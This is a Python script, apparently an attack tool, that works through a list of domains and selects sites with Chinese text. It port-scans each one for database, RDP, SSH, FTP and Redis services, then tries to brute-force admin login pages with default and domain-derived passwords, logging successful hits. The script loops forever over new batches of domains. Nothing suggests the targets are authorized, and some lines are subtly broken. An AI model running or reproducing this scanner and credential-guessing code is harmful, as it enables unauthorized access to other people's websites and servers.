import urllib.request, re, socket, subprocess, sys, time

def scan_round():
    domains = [l.strip() for l in open("/tmp/165_dm.txt") if l.strip()]
    with open("/tmp/scan_v7_out.txt", "a") as out:
        for d in domains:
            if not d: continue
            try:
                req = urllib.request.Request("http://"+d, headers={"User-Agent":"Mozilla/5.0"})
                h = urllib.request.urlopen(req, timeout=5).read().decode("utf-8","ignore")
            except: continue
            if len(h) < 500 or not re.search(r"[\u4e00-\u9fff]{10,}", h): continue
            name = d.split(".")[0]
            try: ip = socket.gethostbyname(d)
            except: ip = ""
            if ip:
                ports = []
                for port,svc in [(3306,"MySQL"),(3389,"RDP"),(22,"SSH"),(21,"FTP"),(6379,"Redis"),(8080,"HTTP-8080")]:
                    try:
                        s = socket.socket(); s.settimeout(1)
                        if s.connect_ex((ip, port)) == 0: ports.append(f"{port}({svc})")
                        s.close()
                    except: pass
                if ports: out.write(f"PORTS: {d}({ip}) | {,.join(ports)}\n")
            for p in ["/admin","/login","/admin/login","/admin.php"]:
                try:
                    req2 = urllib.request.Request("http://"+d+p, headers={"User-Agent":"Mozilla/5.0"})
                    h2 = urllib.request.urlopen(req2, timeout=4).read()
                    s2 = len(h2)
                    if s2 < 300: continue
                    for pw in ["admin","123456","admin123",name,name+"123","admin888"]:
                        data = ("username=admin&password="+pw).encode()
                        req3 = urllib.request.Request("http://"+d+p, data=data, headers={"User-Agent":"Mozilla/5.0","Content-Type":"application/x-www-form-urlencoded"})
                        try:
                            h3 = urllib.request.urlopen(req3, timeout=4).read()
                            s3 = len(h3)
                            if s3 > 3000 and s3 != s2:
                                out.write(f"PASS: {d}|{p}|{pw}|{s3}B\n"); break
                        except: pass
                except: pass
    out.write(f"DONE: 500 scanned\n")

while True:
    scan_round()
    # 换下一批域名
    time.sleep(5)
